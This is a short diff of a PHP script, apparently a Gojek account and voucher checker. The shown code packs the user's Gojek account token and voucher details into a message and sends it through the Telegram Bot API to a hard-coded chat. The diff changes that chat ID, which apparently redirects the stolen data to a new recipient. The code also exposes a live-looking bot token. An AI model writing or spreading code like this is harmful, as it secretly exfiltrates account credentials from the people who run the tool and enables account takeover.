@@ -89,7 +89,7 @@ echo color("red"," ========================================\n");
         $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
         $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
         $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
-	$chatid = "785784404";
+	$chatid = "745965225";
 	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
 	$method	= "sendMessage";
 	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
